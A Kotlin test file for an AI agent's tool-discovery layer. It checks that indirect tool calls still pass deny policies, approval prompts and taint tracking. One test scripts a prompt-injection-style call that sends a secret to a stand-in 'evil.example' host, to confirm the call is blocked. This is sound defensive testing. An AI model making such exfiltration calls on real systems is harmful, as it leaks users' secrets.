package dev.locus.core.agent

import dev.locus.core.llm.AssistantTurn
import dev.locus.core.llm.ChatEvent
import dev.locus.core.llm.ChatModel
import dev.locus.core.llm.ChatRequest
import dev.locus.core.llm.StopReason
import dev.locus.core.model.ApiFormat
import dev.locus.core.model.ApprovalDecision
import dev.locus.core.model.AuditEntry
import dev.locus.core.model.Conversation
import dev.locus.core.model.DiscoveryTools
import dev.locus.core.model.Message
import dev.locus.core.model.Part
import dev.locus.core.model.Role
import dev.locus.core.model.ToolPolicy
import dev.locus.core.model.ToolRisk
import dev.locus.core.model.ToolSpec
import dev.locus.core.model.toolLabel
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow
import kotlinx.coroutines.flow.toList
import kotlinx.coroutines.test.runTest
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put
import kotlinx.serialization.json.putJsonObject
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue

/**
 * Tool discovery (docs/design/tool-discovery.md): a chat declares a fixed core set plus find_tools and
 * call_tool; call_tool runs the named tool exactly as a direct call would, so it can't get around
 * anything a direct call goes through.
 */
class ToolDiscoveryTest {
    private val conversation = Conversation("c", "t", "p", "system", 0, 0)
    private fun user(text: String = "go") = Message("u", "c", Role.USER, listOf(Part.Text(text)), 0)

    private class Scripted(turns: List<AssistantTurn>) : ChatModel {
        private val queue = ArrayDeque(turns)
        val requests = mutableListOf<ChatRequest>()
        override val format = ApiFormat.OPENAI_CHAT
        override fun stream(request: ChatRequest): Flow<ChatEvent> = flow {
            requests += request
            emit(ChatEvent.Completed(queue.removeFirst()))
        }
    }

    private class Store : TranscriptStore {
        val messages = mutableListOf<Message>()
        val audit = mutableListOf<AuditEntry>()
        override suspend fun append(message: Message) { messages += message }
        override suspend fun record(entry: AuditEntry) { audit += entry }
    }

    private class Fake(
        private val name: String,
        override val risk: ToolRisk,
        private val observation: Boolean = risk == ToolRisk.READ,
        private val output: String = "ok",
        description: String = name.replace('_', ' '),
        private val confirm: String? = null,
        schema: JsonObject = ObjectSchema().string("url", "u", required = false).string("text", "t", required = false).build(),
    ) : Tool {
        var runs = 0
        var lastArgs: JsonObject? = null
        override val spec = ToolSpec(name, description, schema)
        override fun describe(args: JsonObject) = "$name ${args.str("url").orEmpty()}".trim()
        override suspend fun isObservation(args: JsonObject) = observation
        override suspend fun mustConfirm(args: JsonObject) = confirm
        override suspend fun execute(args: JsonObject) = ToolResult(output).also { runs++; lastArgs = args }
    }

    private class Gate(private val answer: Boolean = true) : ApprovalGate {
        val asked = mutableListOf<ApprovalRequest>()
        override suspend fun request(request: ApprovalRequest): Boolean = answer.also { asked += request }
    }

    private fun turn(vararg calls: Part.ToolCall) = AssistantTurn("", calls.toList(), StopReason.TOOL_USE, ApiFormat.OPENAI_CHAT, null)
    private val done = AssistantTurn("Done.", emptyList(), StopReason.END_TURN, ApiFormat.OPENAI_CHAT, null)

    private fun callTool(id: String, name: String, arguments: JsonObject = JsonObject(emptyMap())) =
        Part.ToolCall(id, DiscoveryTools.CALL_TOOL, buildJsonObject { put("name", name); put("arguments", arguments) }.toString())

    private fun direct(id: String, name: String, arguments: JsonObject = JsonObject(emptyMap())) = Part.ToolCall(id, name, arguments.toString())

    private var nextId = 0

    /** A registry with discovery: [core] declared, the rest deferred. */
    private fun registry(tools: List<Tool>, core: Set<String>, extras: DiscoverableTools? = null) =
        ToolRegistry(tools).deferring(core + DiscoveryTools.FIND_TOOLS + DiscoveryTools.CALL_TOOL, extras)

    private fun loop(
        model: ChatModel,
        tools: ToolRegistry,
        store: Store,
        gate: ApprovalGate = Gate(),
        policy: (Tool) -> ToolPolicy = { it.defaultPolicy },
        config: AgentConfig = AgentConfig(),
    ) = AgentLoop(model, tools, policy, gate, store, config, ids = { "id${nextId++}" })

    // ---- The declared list -------------------------------------------------------------------------

    @Test
    fun `a discovery registry declares the core set and find and call, and still runs every tool`() {
        val tools = registry(listOf(Fake("read_file", ToolRisk.READ), Fake("github_issues", ToolRisk.READ), Fake("email_send", ToolRisk.NETWORK)), setOf("read_file"))
        assertEquals(listOf("call_tool", "find_tools", "read_file"), tools.specs.map { it.name })
        assertEquals(listOf("email_send", "github_issues"), tools.deferredSpecs.map { it.name })
        assertTrue(tools.discovers)
        assertNotNull(tools["github_issues"])
        // A registry without discovery is unchanged.
        val plain = ToolRegistry(listOf(Fake("read_file", ToolRisk.READ), Fake("github_issues", ToolRisk.READ)))
        assertEquals(listOf("github_issues", "read_file"), plain.specs.map { it.name })
        assertFalse(plain.discovers)
    }

    @Test
    fun `every request of a run sends the same system prompt and tool list, finds and calls included`() = runTest {
        val github = Fake("github_issues", ToolRisk.READ, description = "List issues of a GitHub repository")
        val tools = registry(listOf(Fake("read_file", ToolRisk.READ), github), setOf("read_file"))
        val model = Scripted(
            listOf(
                turn(direct("f", DiscoveryTools.FIND_TOOLS, buildJsonObject { put("query", "github issues") })),
                turn(callTool("c1", "github_issues")),
                turn(direct("r", "read_file")),
                done,
            ),
        )
        loop(model, tools, Store()).run(conversation, listOf(user())).toList()
        assertEquals(4, model.requests.size)
        assertEquals(1, model.requests.map { it.tools }.toSet().size, "the declared tools never change within a run")
        assertEquals(setOf("system"), model.requests.map { it.system }.toSet())
        assertEquals(1, github.runs)
        // Every request is the previous one plus what came after it: the cached prefix holds.
        model.requests.zipWithNext().forEach { (a, b) -> assertEquals(a.messages, b.messages.take(a.messages.size)) }
    }

    // ---- find_tools --------------------------------------------------------------------------------

    private val catalogue = listOf(
        ToolSpec("netlify_deploy", "Deploy a workspace folder to a Netlify site.", ObjectSchema().string("folder", "Workspace folder to upload.").build()),
        ToolSpec("vercel_deploy", "Deploy a workspace folder to Vercel.", ObjectSchema().string("folder", "Folder.").build()),
        ToolSpec("device_alarm", "Set an alarm in the phone's clock app.", ObjectSchema().integer("hour", "Hour, 0-23.").integer("minutes", "Minutes.").build()),
        ToolSpec("device_timer", "Start a countdown timer in the clock app.", ObjectSchema().integer("seconds", "Length.").build()),
        ToolSpec("github_issues", "List or search issues and pull requests in a GitHub repository.", ObjectSchema().string("repo", "owner/name").build()),
        ToolSpec("github_create_issue", "Open a new issue on GitHub.", ObjectSchema().string("repo", "owner/name").string("title", "Title").build()),
        ToolSpec("email_send", "Send an email from the user's mailbox.", ObjectSchema().string("to", "Recipient address").string("subject", "Subject").build()),
        ToolSpec("weather", "Current weather and forecast for a place.", ObjectSchema().string("place", "City or place name").build()),
        ToolSpec("ssh_exec", "Run a shell command on one of the user's machines over SSH.", ObjectSchema().string("host", "Host name").string("command", "Command").build()),
    )

    @Test
    fun `find_tools ranks by names, descriptions and arguments`() {
        val index = ToolIndex(catalogue)
        assertEquals("device_alarm", index.search("set an alarm for 7am", 3).first().name)
        assertEquals("github_issues", index.search("list open github issues", 3).first().name)
        assertEquals(setOf("netlify_deploy", "vercel_deploy"), index.search("deploy my site", 2).map { it.name }.toSet())
        assertEquals("email_send", index.search("send mail to a recipient", 3).first().name)
        assertEquals("ssh_exec", index.search("run a command on my server over ssh", 3).first().name)
        // Argument descriptions count: "city" is only in weather's argument.
        assertEquals("weather", index.search("forecast for my city", 3).first().name)
        // An exact name wins outright, and nothing at all comes back for an unrelated query.
        assertEquals("vercel_deploy", index.search("vercel_deploy", 3).first().name)
        assertEquals(emptyList(), index.search("quantum chromodynamics", 3))
        assertEquals(1, index.search("deploy", 1).size)
    }

    @Test
    fun `find_tools returns full schemas, says how to run them, and marks MCP descriptions as outside text`() = runTest {
        val mcp = object : DiscoverableTools {
            override suspend fun list() = DiscoverableTools.Listing(
                listOf(ToolSpec(DiscoveryTools.mcpName("linear", "create_issue"), "Linear: Create an issue in Linear", ObjectSchema().string("title", "Issue title").build())),
            )
            override fun route(name: String, arguments: JsonObject) = null
        }
        val find = FindTools(catalogue, mcp)
        val ours = find.execute(buildJsonObject { put("query", "set an alarm") }).content
        assertTrue("<tool name=\"device_alarm\">" in ours && "\"hour\"" in ours && "call_tool" in ours, ours)
        assertFalse(UntrustedContent.isMarked(ours))
        val theirs = find.execute(buildJsonObject { put("query", "create an issue in linear") }).content
        assertTrue("mcp__linear__create_issue" in theirs && UntrustedContent.isMarked(theirs), theirs)
        assertTrue("No tool matches" in find.execute(buildJsonObject { put("query", "zzzz") }).content)
        // The description names what can be found, and doesn't change between instances.
        assertTrue("phone apps" in find.spec.description && "GitHub" in find.spec.description && "MCP servers" in find.spec.description)
        assertEquals(find.spec, FindTools(catalogue, mcp).spec)
    }

    // ---- call_tool: the same checks as a direct call -----------------------------------------------

    @Test
    fun `call_tool runs the named tool and answers the call it was`() = runTest {
        val github = Fake("github_issues", ToolRisk.READ, output = "3 issues")
        val store = Store()
        val args = buildJsonObject { put("url", "o/r") }
        loop(Scripted(listOf(turn(callTool("c1", "github_issues", args)), done)), registry(listOf(github), emptySet()), store).run(conversation, listOf(user())).toList()
        assertEquals(1, github.runs)
        assertEquals(args, github.lastArgs)
        val result = store.messages.first { it.role == Role.TOOL }.toolResults.single()
        // The result answers call_tool's own call (providers match by id and name)...
        assertEquals("c1", result.callId)
        assertEquals(DiscoveryTools.CALL_TOOL, result.toolName)
        assertEquals("3 issues", result.content)
        // ...while the activity log records the tool that ran, with its own arguments.
        val entry = store.audit.single()
        assertEquals("github_issues", entry.toolName)
        assertEquals(args.toString(), entry.argumentsJson)
        assertEquals(ApprovalDecision.AUTO_ALLOWED, entry.decision)
    }

    @Test
    fun `a denied tool stays denied through call_tool, whatever call_tool's own policy`() = runTest {
        val send = Fake("email_send", ToolRisk.NETWORK)
        val store = Store()
        // call_tool itself allowed, the tool it names denied: the named tool's policy is the one that counts.
        val policy = { t: Tool -> if (t.spec.name == "email_send") ToolPolicy.DENY else ToolPolicy.ALLOW }
        loop(Scripted(listOf(turn(callTool("c1", "email_send")), done)), registry(listOf(send), emptySet()), store, policy = policy)
            .run(conversation, listOf(user())).toList()
        assertEquals(0, send.runs)
        assertEquals(ApprovalDecision.POLICY_DENIED, store.audit.single().decision)
        assertEquals("email_send", store.audit.single().toolName)
    }

    @Test
    fun `an Ask tool asks through call_tool, naming the real tool and its arguments`() = runTest {
        val send = Fake("email_send", ToolRisk.NETWORK)
        val gate = Gate(answer = false)
        val store = Store()
        val args = buildJsonObject { put("text", "hi") }
        loop(Scripted(listOf(turn(callTool("c1", "email_send", args)), done)), registry(listOf(send), emptySet()), store, gate = gate)
            .run(conversation, listOf(user())).toList()
        val asked = gate.asked.single()
        assertEquals("email_send", asked.toolName)
        assertEquals(args.toString(), asked.argumentsJson)
        assertEquals("c1", asked.callId)
        assertEquals(0, send.runs)
        assertEquals(ApprovalDecision.USER_DENIED, store.audit.single().decision)
    }

    @Test
    fun `a forced confirmation still asks through call_tool`() = runTest {
        val pay = Fake("browser_click", ToolRisk.WRITE, confirm = "This looks like a payment.")
        val gate = Gate(answer = true)
        loop(Scripted(listOf(turn(callTool("c1", "browser_click")), done)), registry(listOf(pay), emptySet()), Store(), gate = gate, policy = { ToolPolicy.ALLOW })
            .run(conversation, listOf(user())).toList()
        assertTrue("payment" in gate.asked.single().summary)
        assertEquals(1, pay.runs)
    }

    @Test
    fun `taint gates an outward tool run through call_tool as it gates a direct call`() = runTest {
        val read = Fake("web_read", ToolRisk.READ, output = "page text")
        val send = Fake("email_send", ToolRisk.NETWORK)
        val gate = Gate(answer = false)
        val store = Store()
        loop(
            Scripted(listOf(turn(callTool("c1", "web_read", buildJsonObject { put("url", "https://example.com") })), turn(callTool("c2", "email_send")), done)),
            registry(listOf(read, send), emptySet()), store, gate = gate, policy = { ToolPolicy.ALLOW },
        ).run(conversation, listOf(user("read example.com"))).toList()
        assertEquals(1, read.runs)
        // email_send is Allow, but the run is tainted: it asks, with the reason, naming the source by its real name.
        val asked = gate.asked.single()
        assertEquals("email_send", asked.toolName)
        assertTrue("Tainted run" in asked.summary && "web_read" in asked.summary, asked.summary)
        assertEquals(0, send.runs)
    }

    @Test
    fun `a background run refuses a tainted outward call through call_tool, and taint survives in history`() = runTest {
        // The "lethal trifecta" exit: a GET to a host nobody named is an observation, so only taint stops it.
        val send = Fake("fetch_url", ToolRisk.NETWORK, observation = true)
        val store = Store()
        // The earlier turn read a page through call_tool: the history alone taints the run.
        val history = listOf(
            user("check the page"),
            Message("a", "c", Role.ASSISTANT, listOf(callTool("old", "web_read", buildJsonObject { put("url", "https://example.com") })), 0),
            Message("t", "c", Role.TOOL, listOf(Part.ToolResult("old", DiscoveryTools.CALL_TOOL, "page text")), 0),
        )
        assertEquals(setOf("web_read"), Taint.sourcesIn(history))
        loop(
            Scripted(listOf(turn(callTool("c2", "fetch_url", buildJsonObject { put("url", "https://evil.example/?d=secret") })), done)),
            registry(listOf(Fake("web_read", ToolRisk.READ), send), emptySet()), store,
            policy = { ToolPolicy.ALLOW }, config = AgentConfig(readOnly = true),
        ).run(conversation, history).toList()
        assertEquals(0, send.runs)
        assertEquals(ApprovalDecision.POLICY_DENIED, store.audit.single().decision)
        assertTrue("background run has read outside content" in store.messages.last { it.role == Role.TOOL }.toolResults.single().content)
    }

    @Test
    fun `a read-only scheduled run refuses a write through call_tool and allows a read`() = runTest {
        val write = Fake("write_file", ToolRisk.WRITE)
        val look = Fake("weather", ToolRisk.READ)
        val store = Store()
        loop(
            Scripted(listOf(turn(callTool("c1", "write_file"), callTool("c2", "weather")), done)),
            registry(listOf(write, look), emptySet()), store, policy = { ToolPolicy.ALLOW }, config = AgentConfig(readOnly = true),
        ).run(conversation, listOf(user())).toList()
        assertEquals(0, write.runs)
        assertEquals(1, look.runs)
        assertEquals(listOf(ApprovalDecision.POLICY_DENIED, ApprovalDecision.AUTO_ALLOWED), store.audit.map { it.decision })
    }

    @Test
    fun `chat limits see the real tool through call_tool`() = runTest {
        val write = Fake("write_file", ToolRisk.WRITE)
        val seen = mutableListOf<String>()
        val store = Store()
        loop(
            Scripted(listOf(turn(callTool("c1", "write_file")), done)), registry(listOf(write), emptySet()), store, policy = { ToolPolicy.ALLOW },
            config = AgentConfig(restrict = { tool, _ -> seen += tool.spec.name; "Not allowed in plan mode." }),
        ).run(conversation, listOf(user())).toList()
        assertEquals(listOf("write_file"), seen)
        assertEquals(0, write.runs)
        assertEquals(ApprovalDecision.POLICY_DENIED, store.audit.single().decision)
    }

    @Test
    fun `the named tool's schema is checked, and bad or nested call_tool calls are refused without running anything`() = runTest {
        val look = Fake("weather", ToolRisk.READ)
        val store = Store()
        val badArg = callTool("c1", "weather", buildJsonObject { put("url", 5) })
        val unknown = callTool("c2", "no_such_tool")
        val nested = callTool("c3", DiscoveryTools.CALL_TOOL, buildJsonObject { put("name", "weather") })
        val noName = Part.ToolCall("c4", DiscoveryTools.CALL_TOOL, """{"arguments":{}}""")
        val badArguments = Part.ToolCall("c5", DiscoveryTools.CALL_TOOL, """{"name":"weather","arguments":[1]}""")
        loop(Scripted(listOf(turn(badArg, unknown, nested, noName, badArguments), done)), registry(listOf(look), emptySet()), store).run(conversation, listOf(user())).toList()
        assertEquals(0, look.runs)
        assertEquals(List(5) { ApprovalDecision.INVALID_INPUT }, store.audit.map { it.decision })
        val results = store.messages.first { it.role == Role.TOOL }.toolResults
        assertTrue("type string" in results[0].content)
        assertTrue("find_tools" in results[1].content)
        assertTrue("call call_tool directly" in results[2].content)
        assertTrue("Missing `name`" in results[3].content)
        assertTrue("JSON object" in results[4].content)
        assertTrue(results.all { it.toolName == DiscoveryTools.CALL_TOOL && it.isError })
    }

    @Test
    fun `call_tool's arguments may come as a JSON string`() = runTest {
        val look = Fake("weather", ToolRisk.READ)
        val call = Part.ToolCall("c1", DiscoveryTools.CALL_TOOL, """{"name":"weather","arguments":"{\"url\":\"x\"}"}""")
        loop(Scripted(listOf(turn(call), done)), registry(listOf(look), emptySet()), Store()).run(conversation, listOf(user())).toList()
        assertEquals("x", look.lastArgs?.str("url"))
    }

    @Test
    fun `reads through call_tool still run side by side and keep their order`() = runTest {
        val a = Fake("weather", ToolRisk.READ, output = "sunny")
        val b = Fake("wikipedia", ToolRisk.READ, output = "article")
        val store = Store()
        loop(Scripted(listOf(turn(callTool("c1", "weather"), callTool("c2", "wikipedia")), done)), registry(listOf(a, b), emptySet()), store, policy = { ToolPolicy.ALLOW })
            .run(conversation, listOf(user())).toList()
        assertEquals(listOf("sunny", "article"), store.messages.first { it.role == Role.TOOL }.toolResults.map { it.content })
        assertEquals(listOf("weather", "wikipedia"), store.audit.map { it.toolName })
    }

    @Test
    fun `an MCP tool found through discovery runs as the mcp_call it maps to`() = runTest {
        val mcpCall = Fake(
            "mcp_call", ToolRisk.NETWORK,
            schema = ObjectSchema().string("connector", "c").string("tool", "t").obj("arguments", "a").build(),
        )
        val extras = object : DiscoverableTools {
            override suspend fun list() = DiscoverableTools.Listing(emptyList())
            override fun route(name: String, arguments: JsonObject): Pair<String, JsonObject>? {
                val (connector, tool) = DiscoveryTools.parseMcpName(name) ?: return null
                return "mcp_call" to buildJsonObject { put("connector", connector); put("tool", tool); put("arguments", arguments) }
            }
        }
        val gate = Gate(answer = true)
        val store = Store()
        val args = buildJsonObject { put("title", "Bug") }
        loop(Scripted(listOf(turn(callTool("c1", DiscoveryTools.mcpName("linear", "create_issue"), args)), done)), registry(listOf(mcpCall), emptySet(), extras), store, gate = gate)
            .run(conversation, listOf(user())).toList()
        assertEquals("mcp_call", gate.asked.single().toolName)
        assertEquals("linear", mcpCall.lastArgs?.str("connector"))
        assertEquals("create_issue", mcpCall.lastArgs?.str("tool"))
        assertEquals(args, mcpCall.lastArgs?.get("arguments"))
        assertEquals("mcp_call", store.audit.single().toolName)
    }

    @Test
    fun `labels and activity read as the tool that ran`() {
        val args = buildJsonObject { put("name", "read_file"); putJsonObject("arguments") { put("path", "notes.md") } }.toString()
        assertEquals(toolLabel("read_file", """{"path":"notes.md"}"""), toolLabel(DiscoveryTools.CALL_TOOL, args))
        assertEquals("linear · create_issue", toolLabel(DiscoveryTools.mcpName("linear", "create_issue"), "{}"))
        assertNull(DiscoveryTools.parseMcpName("mcp_call"))
        assertEquals("read_file" to """{"path":"notes.md"}""", DiscoveryTools.unwrap(DiscoveryTools.CALL_TOOL, args))
    }

    @Test
    fun `helpers may always search for tools`() {
        val profile = dev.locus.core.agent.tools.AgentProfile("r", "R", "d", tools = listOf("read_file"), instructions = "")
        assertTrue(profile.allows(DiscoveryTools.FIND_TOOLS))
        assertFalse(profile.allows("email_send"))
    }

    @Test
    fun `the v1 core keeps what the system prompt names for everyday work, and the discovery tools`() {
        val core = ToolDiscovery.CORE_V1
        listOf("read_file", "edit_file", "run_command", "web_search", "memory_save", "todo_write", "plan_propose", "ask_user", "agent_spawn", "browser_ask_user", "find_tools", "call_tool")
            .forEach { assertTrue(it in core, it) }
        listOf("github_issues", "email_send", "device_alarm", "ssh_exec", "vercel_deploy").forEach { assertFalse(it in core, it) }
        assertEquals(ToolDiscovery.CORE_V1, ToolDiscovery.core("v1"))
        assertEquals(ToolDiscovery.CORE_V1, ToolDiscovery.core("v9"), "a newer version this build doesn't know keeps the v1 set")
        assertNull(ToolDiscovery.core(null))
    }
}
